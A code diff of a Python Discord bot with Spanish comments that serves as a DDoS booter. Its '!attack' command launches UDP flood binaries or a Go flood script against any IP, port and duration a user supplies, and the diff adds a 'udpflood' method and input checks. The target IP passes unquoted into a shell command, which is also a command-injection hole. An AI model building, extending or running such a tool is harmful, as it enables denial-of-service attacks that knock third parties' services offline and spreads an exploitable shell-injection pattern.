@@ -3,28 +3,21 @@ import discord
 from discord.ext import commands
 import asyncio
 
-# Lee EL TOKEN directamente desde la variable de entorno KEYS (se espera que el secret de GitHub Actions
-# se haya expuesto como env var KEYS). Si no está definido, termina con error.
 TOKEN = os.getenv('KEYS')
 if not TOKEN:
-    print("ERROR: No se ha encontrado el token de Discord, define la variable de entorno KEYS (por ejemplo desde secrets.KEYS en GitHub Actions).")
+    print("ERROR: No se ha encontrado el token de Discord")
     exit(1)
 
-# Prefijo para los comandos del bot
-BOT_PREFIX = '$'
-
-# Inicializa el bot con intents básicos
+BOT_PREFIX = '!'
 intents = discord.Intents.default()
-intents.message_content = True  # Necesario para leer los mensajes
+intents.message_content = True
 bot = commands.Bot(command_prefix=BOT_PREFIX, intents=intents)
 
-# Evento que se ejecuta cuando el bot está listo
 @bot.event
 async def on_ready():
     print(f'Bot conectado como {bot.user.name}')
-    await bot.change_presence(activity=discord.Game(name="Atacando con UDP"))
+    await bot.change_presence(activity=discord.Game(name="Atacando Galaxy"))
 
-# Función para ejecutar el ataque y notificar al terminar
 async def ejecutar_ataque(comando: str, ctx, ip: str, port: int, tiempo: int):
     try:
         proceso = await asyncio.create_subprocess_shell(
@@ -34,61 +27,79 @@ async def ejecutar_ataque(comando: str, ctx, ip: str, port: int, tiempo: int):
         )
         stdout, stderr = await proceso.communicate()
 
-        # Envía mensaje al canal indicando que el ataque finalizó (sin código de salida ni salida del proceso)
         try:
             await ctx.send(f"Attack {ip}:{port} finished {tiempo}")
-        except Exception as e:
-            # En caso de que no se pueda enviar el mensaje al canal (por permisos, ctx expirado, etc.)
-            print(f"No pude enviar el mensaje de finalización al canal: {e}")
-
-        print(f"El ataque con comando '{comando}' finished")
-    except Exception as e:
-        print(f"Error al ejecutar el ataque: {e}")
-        try:
-            await ctx.send(f'Error al ejecutar el ataque: {e}')
         except:
             pass
 
-# Comando !attack
+        print(f"Ataque '{comando}' terminado")
+    except Exception as e:
+        print(f"Error: {e}")
+        try:
+            await ctx.send(f'Error: {e}')
+        except:
+            pass
+
 @bot.command(name='attack', help='!attack {method} {ip} {port} {time}')
-async def attack(ctx, metodo: str, ip: str, port: int, tiempo: int):
-    """
-    Attack udpflood, attack udphex, attack udppps mayor PPS
-    """
-    if metodo == 'udp':
-        # Construye el comando para udp (antiguo udphexv1) con los valores por defecto
-        comando = f'./udp {ip} {port} -t 32 -s 64 -d {tiempo}'
-        await ctx.send(f'Successful Attack UDP TargetIP:{ip} TargetPort:{port} Time:{tiempo}')
-    elif metodo == 'udphex':
-        # Construye el comando para udphex (antiguo udphexv2)
-        comando = f'./udphex {ip} {port} {tiempo}'
-        await ctx.send(f'Successful Attack UDPHEX TargetIP:{ip} TargetPort:{port} Time:{tiempo}')
-    elif metodo == 'udppps':
-        # Construye el comando para el nuevo método udppps
-        comando = f'./udppps {ip} {port} {tiempo}'
-        await ctx.send(f'Successful Attack UDPpps TargetIP:{ip} TargetPort:{port} Time:{tiempo}')
-    else:
-        await ctx.send('Métodos disponibles: udp, udphex, udppps')
+async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiempo: str = None):
+    if metodo is None or ip is None or port is None or tiempo is None:
+        await ctx.send("!attack {method} {ip} {port} {time}")
         return
 
-    # Ejecuta el comando en un proceso separado (fire and forget) y notifica al terminar
-    try:
-        asyncio.create_task(ejecutar_ataque(comando, ctx, ip, port, tiempo))
-    except Exception as e:
-        await ctx.send(f'Error attack: {e}')
+    # Verificar que no haya nulls
+    if ip == "null" or port == "null" or tiempo == "null":
+        await ctx.send("Faltan parametros ip, puerto o tiempo")
+        return
 
-# Comando !methods - Muestra los métodos disponibles
-@bot.command(name='methods', help='Metodos de ataque')
+    try:
+        port_int = int(port)
+        tiempo_int = int(tiempo)
+    except:
+        await ctx.send("Puerto y tiempo deben ser números")
+        return
+
+    if port_int < 1 or port_int > 65535:
+        await ctx.send("Puerto inválido")
+        return
+
+    if tiempo_int <= 0:
+        await ctx.send("El tiempo debe ser mayor a 0")
+        return
+
+    if metodo == 'udp':
+        comando = f'./udp {ip} {port_int} -t 32 -s 64 -d {tiempo_int}'
+        await ctx.send(f'Successful Attack UDP TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
+    
+    elif metodo == 'udphex':
+        comando = f'./udphex {ip} {port_int} {tiempo_int}'
+        await ctx.send(f'Successful Attack UDPHEX TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
+    
+    elif metodo == 'udppps':
+        comando = f'./udppps {ip} {port_int} {tiempo_int}'
+        await ctx.send(f'Successful Attack UDPpps TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
+    
+    elif metodo == 'udpflood':
+        comando = f'go run udpflood.go {ip} {port_int} {tiempo_int}'
+        await ctx.send(f'Successful Attack UDPFlood TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
+    
+    else:
+        await ctx.send('Métodos: udp, udphex, udppps, udpflood')
+        return
+
+    try:
+        asyncio.create_task(ejecutar_ataque(comando, ctx, ip, port_int, tiempo_int))
+    except Exception as e:
+        await ctx.send(f'Error: {e}')
+
+@bot.command(name='methods')
 async def show_methods(ctx):
     methods_info = """
 **Métodos disponibles:**
-• **udp** - Método UDPFlood, consumo mayor de la cpu
-  `!attack udp <ip> <puerto> <tiempo>`
-• **udphex** - Método UDPHEX
-  `!attack udphex <ip> <puerto> <tiempo>`
-• **udppps** - Metodo UDPpps, the best power
-  `!attack udppps <ip> <puerto> <tiempo>`
-    """
+• **udp** - UDPFlood, consumo mayor de cpu
+• **udphex** - UDPHEX
+• **udppps** - UDPpps, the best power
+• **udpflood** - UDPFlood Gbps
+"""
     await ctx.send(methods_info)
 
 bot.run(TOKEN)
